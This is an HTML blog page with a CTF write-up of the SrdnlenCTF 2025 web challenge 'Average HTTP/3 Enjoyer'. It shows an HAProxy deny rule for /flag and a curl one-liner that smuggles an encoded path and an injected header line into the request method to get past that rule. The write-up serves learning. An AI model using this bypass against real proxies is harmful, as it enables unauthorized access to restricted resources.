@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>🌐 Average HTTP/3 Enjoyer - mH4ck3r0n3&#39;s Blog</title><script src="https://cdn.jsdelivr.net/npm/fuse.js@6.4.6/dist/fuse.min.js"></script>
+<meta name="Description" content="A detailed write-up of the Web challenge &#39;Average HTTP/3 Enjoyer&#39; from SrdnlenCTF - 2025"><meta property="og:url" content="https://mh4ck3r0n3.github.io/posts/2025/02/05/average-http/3-enjoyer/">
+  <meta property="og:site_name" content="mH4ck3r0n3&#39;s Blog">
+  <meta property="og:title" content="🌐 Average HTTP/3 Enjoyer">
+  <meta property="og:description" content="A detailed write-up of the Web challenge &#39;Average HTTP/3 Enjoyer&#39; from SrdnlenCTF - 2025">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-05T21:02:02+01:00">
+    <meta property="article:modified_time" content="2025-02-05T21:02:02+01:00">
+    <meta property="article:tag" content="🚫 403 Bypass">
+    <meta property="article:tag" content="🚫 Proxy Rule Bypass">
+    <meta property="article:tag" content="🛡️ HAProxy">
+    <meta property="article:tag" content="🌐 Web Security">
+    <meta property="og:image" content="https://mh4ck3r0n3.github.io/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://mh4ck3r0n3.github.io/logo.png">
+  <meta name="twitter:title" content="🌐 Average HTTP/3 Enjoyer">
+  <meta name="twitter:description" content="A detailed write-up of the Web challenge &#39;Average HTTP/3 Enjoyer&#39; from SrdnlenCTF - 2025">
+<meta name="application-name" content="mH4ck3r0n3&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="mH4ck3r0n3&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mh4ck3r0n3.github.io/posts/2025/02/05/average-http/3-enjoyer/" /><link rel="prev" href="https://mh4ck3r0n3.github.io/posts/2025/02/05/focus.-speed.-i-am-speed./" /><link rel="next" href="https://mh4ck3r0n3.github.io/posts/2025/02/05/sparkling-sky/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><meta name="google-site-verification" content="Z-UoSLcRkeqd45L7xfo6KhHLAHRigsRvXpv1cYBypy4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "🌐 Average HTTP/3 Enjoyer",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mh4ck3r0n3.github.io\/posts\/2025\/02\/05\/average-http\/3-enjoyer\/"
+        },"genre": "posts","keywords": "🚫 403 Bypass, 🚫 Proxy Rule Bypass, 🛡️ HAProxy, 🌐 Web Security","wordcount":  523 ,
+        "url": "https:\/\/mh4ck3r0n3.github.io\/posts\/2025\/02\/05\/average-http\/3-enjoyer\/","datePublished": "2025-02-05T21:02:02+01:00","dateModified": "2025-02-05T21:02:02+01:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "mH4ck3r0n3"
+            },"description": "A detailed write-up of the Web challenge 'Average HTTP/3 Enjoyer' from SrdnlenCTF - 2025"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="mH4ck3r0n3&#39;s Blog"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span><span id="id-2" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"> Posts </a><a class="menu-item" href="/categories/" title="Categories"> Categories </a><a class="menu-item" href="/tags/" title="Tags"> Tags </a><a class="menu-item" href="/about/" title="About Me"> About Me </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="mH4ck3r0n3&#39;s Blog"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span><span id="id-3" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts">Posts</a><a class="menu-item" href="/categories/" title="Categories">Categories</a><a class="menu-item" href="/tags/" title="Tags">Tags</a><a class="menu-item" href="/about/" title="About Me">About Me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">🌐 Average HTTP/3 Enjoyer</h1><h2 class="single-subtitle">A detailed write-up of the Web challenge &#39;Average HTTP/3 Enjoyer&#39; from SrdnlenCTF - 2025</h2><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://mh4ck3r0n3.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>mH4ck3r0n3</a></span><span class="post-category"><a href="/categories/ethical-hacking/ctfs/jeopardy/srdnlenctf-2025/web/">
+                                    <i class="far fa-folder fa-fw" aria-hidden="true"></i> Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web
+                                </a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="05/02/2025">05/02/2025</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;523 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#-challenge-overview">📊 Challenge Overview</a></li>
+        <li><a href="#-challenge-information">📝 Challenge Information</a></li>
+        <li><a href="#-challenge-files--infrastructure">🎯 Challenge Files &amp; Infrastructure</a>
+          <ul>
+            <li><a href="#provided-files">Provided Files</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#-initial-analysis">🔍 Initial Analysis</a>
+      <ul>
+        <li><a href="#first-steps">First Steps</a></li>
+        <li><a href="#-vulnerability-analysis">🔬 Vulnerability Analysis</a>
+          <ul>
+            <li><a href="#potential-vulnerabilities">Potential Vulnerabilities</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#-solution-path">🎯 Solution Path</a>
+      <ul>
+        <li><a href="#exploitation-steps">Exploitation Steps</a>
+          <ul>
+            <li><a href="#initial-setup">Initial setup</a></li>
+            <li><a href="#exploitation">Exploitation</a></li>
+            <li><a href="#flag-capture">Flag capture</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#-exploitation-process">🛠️ Exploitation Process</a>
+      <ul>
+        <li><a href="#approach">Approach</a></li>
+      </ul>
+    </li>
+    <li><a href="#-flag-capture">🚩 Flag Capture</a>
+      <ul>
+        <li><a href="#proof-of-execution">Proof of Execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#-tools-used">🔧 Tools Used</a></li>
+    <li><a href="#-key-learnings">💡 Key Learnings</a>
+      <ul>
+        <li><a href="#new-knowledge">New Knowledge</a></li>
+        <li><a href="#skills-improved">Skills Improved</a></li>
+      </ul>
+    </li>
+    <li><a href="#-references--resources">📚 References &amp; Resources</a>
+      <ul>
+        <li><a href="#learning-resources">Learning Resources</a></li>
+      </ul>
+    </li>
+    <li><a href="#-final-statistics">📊 Final Statistics</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><figure><a class="lightgallery" href="/images/SrdnlenCTF-2025/AverageHTTP3/challenge_presentation.png" title="Challenge Presentation" data-thumbnail="/images/SrdnlenCTF-2025/AverageHTTP3/challenge_presentation.png" data-sub-html="<h2>Challenge Presentation</h2><p>Challenge Presentation</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/SrdnlenCTF-2025/AverageHTTP3/challenge_presentation.png"
+            data-srcset="/images/SrdnlenCTF-2025/AverageHTTP3/challenge_presentation.png, /images/SrdnlenCTF-2025/AverageHTTP3/challenge_presentation.png 1.5x, /images/SrdnlenCTF-2025/AverageHTTP3/challenge_presentation.png 2x"
+            data-sizes="auto"
+            alt="/images/SrdnlenCTF-2025/AverageHTTP3/challenge_presentation.png" />
+    </a><figcaption class="image-caption">Challenge Presentation</figcaption>
+    </figure></p>
+<h2 id="-challenge-overview">📊 Challenge Overview</h2>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Details</th>
+<th>Additional Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>🏆 Event</td>
+<td>SrdlenCTF - 2025</td>
+<td><a href="https://ctf.srdnlen.it/challenges#challenge-21" target="_blank" rel="noopener noreffer ">Event Link</a></td>
+</tr>
+<tr>
+<td>🔰 Category</td>
+<td>Web</td>
+<td>🌐</td>
+</tr>
+<tr>
+<td>💎 Points</td>
+<td>405</td>
+<td>Out of 500 total</td>
+</tr>
+<tr>
+<td>⭐ Difficulty</td>
+<td>🟡 Medium</td>
+<td>Personal Rating: 3/10</td>
+</tr>
+<tr>
+<td>👤 Author</td>
+<td>pysu</td>
+<td><a href="" rel="">Profile</a></td>
+</tr>
+<tr>
+<td>🎮 Solves</td>
+<td>23</td>
+<td>XX% solve rate</td>
+</tr>
+<tr>
+<td>📅 Date</td>
+<td>19-01-2025</td>
+<td>SrdlenCTF - 2025 Day X</td>
+</tr>
+<tr>
+<td>🦾 Solved By</td>
+<td>aquila2</td>
+<td>Team: Team Aetruria</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<h2 id="-challenge-information">📝 Challenge Information</h2>
+<blockquote>
+<p>HTTP/3 is just the best version of HTTP, wait a few years, until setting up an HTTP/3 server will not be a pain, and you’ll see. I hid a secret on /flag, you can only get it if you become a real HTTP/3 enjoyer.  NOTE: This challenge uses only HTTP/3, browsers are a bit hesitant in using it by default, so you’ll have to use explicit arguments to do so.  In chrome you can do the following:<br>
+chrome &ndash;enable-quic &ndash;origin-to-force-quic-on=enjoyer.challs.ctf.srdnlen.it</p>
+</blockquote>
+<h2 id="-challenge-files--infrastructure">🎯 Challenge Files &amp; Infrastructure</h2>
+<h3 id="provided-files">Provided Files</h3>
+<blockquote>
+<p>Files:</p>
+<ul>
+<li><a href="https://drive.google.com/file/d/1KcEalyyC9hSqsCTTvd0OpFOcBRPjZt2v/view?usp=drive_link" target="_blank" rel="noopener noreffer "><i class="far fa-file-archive fa-fw" aria-hidden="true"></i>&nbsp;Attached Files</a></li>
+</ul>
+</blockquote>
+<h1 id="-initial-analysis">🔍 Initial Analysis</h1>
+<h2 id="first-steps">First Steps</h2>
+<blockquote>
+<p>After an initial analysis and some research, I tried making a request with <code>curl</code> using the <code>--http3</code> option:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl --http3 https://enjoyer.challs.ctf.srdnlen.it
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since the site was not reachable without <code>HTTP/3</code> support, I proceeded to access the <code>/flag</code> route using <code>curl</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl --http3 https://enjoyer.challs.ctf.srdnlen.it/flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Receiving a response with a <code>403 Unauthorized</code> error:</p>
+<p><figure><a class="lightgallery" href="/images/SrdnlenCTF-2025/AverageHTTP3/forbidden.png" title="Forbidden" data-thumbnail="/images/SrdnlenCTF-2025/AverageHTTP3/forbidden.png" data-sub-html="<h2>Forbidden</h2><p>Forbidden</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/SrdnlenCTF-2025/AverageHTTP3/forbidden.png"
+            data-srcset="/images/SrdnlenCTF-2025/AverageHTTP3/forbidden.png, /images/SrdnlenCTF-2025/AverageHTTP3/forbidden.png 1.5x, /images/SrdnlenCTF-2025/AverageHTTP3/forbidden.png 2x"
+            data-sizes="auto"
+            alt="/images/SrdnlenCTF-2025/AverageHTTP3/forbidden.png" />
+    </a><figcaption class="image-caption">Forbidden</figcaption>
+    </figure></p>
+<p>Then I noticed that this was being blocked through the server&rsquo;s <code>proxy rules</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> acl restricted_flag path_sub,url_dec -m sub -i i /flag
+</span></span><span class="line"><span class="cl"> http-request deny if restricted_flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Through an <code>HAProxy</code> proxy. So I started doing some research online to find an effective <code>bypass</code> for this proxy rule.</p>
+</blockquote>
+<h2 id="-vulnerability-analysis">🔬 Vulnerability Analysis</h2>
+<h3 id="potential-vulnerabilities">Potential Vulnerabilities</h3>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw" aria-hidden="true"></i> 403 Bypass</li>
+<li><i class="far fa-check-square fa-fw" aria-hidden="true"></i> Proxy Rule Bypass</li>
+</ul>
+</blockquote>
+<h1 id="-solution-path">🎯 Solution Path</h1>
+<h2 id="exploitation-steps">Exploitation Steps</h2>
+<h3 id="initial-setup">Initial setup</h3>
+<blockquote>
+<p>After searching online, as mentioned earlier, I found the page on <a href="https://stackoverflow.com/questions/63689649/make-an-http-request-without-a-forward-slash/76882066#76882066" target="_blank" rel="noopener noreffer ">StackOvreflow</a>, from which I figured out how to craft the exploit. The trick was to <code>URL-encode</code> the slash (<code>/</code>) in a special syntax, but I also tried using the <code>--path-as-is</code> option in curl, but it didn&rsquo;t work. After that, I needed to craft any <code>header</code> to bypass the rule.</p>
+</blockquote>
+<h3 id="exploitation">Exploitation</h3>
+<blockquote>
+<p>With the following exploit, I was able to obtain the flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;\n&#34;</span><span class="p">;</span> curl --insecure -X <span class="s2">&#34;</span><span class="k">$(</span><span class="nb">echo</span> -en <span class="s1">&#39;GET %2fflag 1/\r\nX-Ignore-Injection:&#39;</span><span class="k">)</span><span class="s2">&#34;</span> https://enjoyer.challs.ctf.srdnlen.it --http3
+</span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
+<h3 id="flag-capture">Flag capture</h3>
+<blockquote>
+<p><figure><a class="lightgallery" href="/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png" title="Manual Flag" data-thumbnail="/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png" data-sub-html="<h2>Manual Flag</h2><p>Manual Flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png"
+            data-srcset="/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png, /images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png 1.5x, /images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png 2x"
+            data-sizes="auto"
+            alt="/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png" />
+    </a><figcaption class="image-caption">Manual Flag</figcaption>
+    </figure></p>
+</blockquote>
+<h1 id="-exploitation-process">🛠️ Exploitation Process</h1>
+<h2 id="approach">Approach</h2>
+<blockquote>
+<p>I wasn&rsquo;t able to write the automatic exploit in Python due to issues with <code>HTTP/3</code>. I also tried using <code>httpx</code>, but it didn&rsquo;t work. I even attempted using <code>bash script</code>, but without success.</p>
+<ul>
+<li><a href="" rel=""><i class="far fa-file-archive fa-fw" aria-hidden="true"></i>&nbsp;None</a></li>
+</ul>
+</blockquote>
+<h1 id="-flag-capture">🚩 Flag Capture</h1>
+<blockquote>
+<div class="details admonition danger open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-skull-crossbones fa-fw" aria-hidden="true"></i>Flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><div class="typeit"><h4 id="id-1"></h4></div>
+<blockquote>
+</blockquote>
+</div>
+        </div>
+    </div>
+</blockquote>
+<h2 id="proof-of-execution">Proof of Execution</h2>
+<blockquote>
+<p><figure><a class="lightgallery" href="/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png" title="Automated Flag" data-thumbnail="/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png" data-sub-html="<h2>Automated Flag</h2><p>Automated Flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png"
+            data-srcset="/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png, /images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png 1.5x, /images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png 2x"
+            data-sizes="auto"
+            alt="/images/SrdnlenCTF-2025/AverageHTTP3/manual_flag.png" />
+    </a><figcaption class="image-caption">Automated Flag</figcaption>
+    </figure>
+<em>Screenshot of successful exploitation</em></p>
+</blockquote>
+<h1 id="-tools-used">🔧 Tools Used</h1>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Curl</td>
+<td>Http3 request</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<h1 id="-key-learnings">💡 Key Learnings</h1>
+<h2 id="new-knowledge">New Knowledge</h2>
+<blockquote>
+<p>I learned about HTTP Request Smuggling and Header Smuggling from this challenge, but in the end, it was a bypass of the proxy rules through encoding with the addition of a crafted header field.</p>
+</blockquote>
+<h2 id="skills-improved">Skills Improved</h2>
+<blockquote>
+<ul>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Binary Exploitation</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Reverse Engineering</li>
+<li><i class="far fa-check-square fa-fw" aria-hidden="true"></i> Web Exploitation</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Cryptography</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Forensics</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> OSINT</li>
+<li><i class="far fa-square fa-fw" aria-hidden="true"></i> Miscellaneous</li>
+</ul>
+</blockquote>
+<h1 id="-references--resources">📚 References &amp; Resources</h1>
+<h2 id="learning-resources">Learning Resources</h2>
+<blockquote>
+<ul>
+<li><a href="https://hacktricks.boitatech.com.br/pentesting/pentesting-web/403-and-401-bypasses" target="_blank" rel="noopener noreffer ">https://hacktricks.boitatech.com.br/pentesting/pentesting-web/403-and-401-bypasses</a></li>
+<li><a href="https://stackoverflow.com/questions/63689649/make-an-http-request-without-a-forward-slash/76882066#76882066" target="_blank" rel="noopener noreffer ">https://stackoverflow.com/questions/63689649/make-an-http-request-without-a-forward-slash/76882066#76882066</a></li>
+</ul>
+</blockquote>
+<hr>
+<h1 id="-final-statistics">📊 Final Statistics</h1>
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>Value</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Time to Solve</td>
+<td>00:30</td>
+<td>From start to flag</td>
+</tr>
+<tr>
+<td>Global Ranking</td>
+<td>22/1572</td>
+<td>Challenge ranking</td>
+</tr>
+<tr>
+<td>Points Earned</td>
+<td>405</td>
+<td>Team contribution</td>
+</tr>
+</tbody>
+</table>
+<p><em>Created: 19-01-2025 • Last Modified: 19-01-2025</em>
+<em>Author: mH4ck3r0n3 • Team: Team Aetruria</em></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 05/02/2025</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/posts/2025/02/05/average-http/3-enjoyer/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/average-http/3-enjoyer/" data-title="🌐 Average HTTP/3 Enjoyer" data-hashtags="🚫 403 Bypass,🚫 Proxy Rule Bypass,🛡️ HAProxy,🌐 Web Security"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/average-http/3-enjoyer/" data-hashtag="🚫 403 Bypass"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/average-http/3-enjoyer/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/average-http/3-enjoyer/" data-title="🌐 Average HTTP/3 Enjoyer" data-web><i class="fab fa-whatsapp fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/average-http/3-enjoyer/" data-title="🌐 Average HTTP/3 Enjoyer"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/average-http/3-enjoyer/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/average-http/3-enjoyer/" data-title="🌐 Average HTTP/3 Enjoyer"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://mh4ck3r0n3.github.io/posts/2025/02/05/average-http/3-enjoyer/" data-title="🌐 Average HTTP/3 Enjoyer"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/403-bypass/">🚫 403 Bypass</a>,&nbsp;<a href="/tags/proxy-rule-bypass/">🚫 Proxy Rule Bypass</a>,&nbsp;<a href="/tags/%EF%B8%8F-haproxy/">🛡️ HAProxy</a>,&nbsp;<a href="/tags/web-security/">🌐 Web Security</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+
+    <div class="post-nav"><a href="/posts/2025/02/05/focus.-speed.-i-am-speed./" class="prev" rel="prev" title="🌐 Focus. Speed. I Am Speed."><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>🌐 Focus. Speed. I Am Speed.</a>
+        <a href="/posts/2025/02/05/sparkling-sky/" class="next" rel="next" title="🌐 Sparkling Sky">🌐 Sparkling Sky<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://mh4ck3r0n3.github.io/" target="_blank">mH4ck3r0n3</a></span>&nbsp;|&nbsp;<span class="license"><a rel="This is free and unencumbered software released into the public domain." href="https://unlicense.org" target="_blank">The Unlicense</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript" 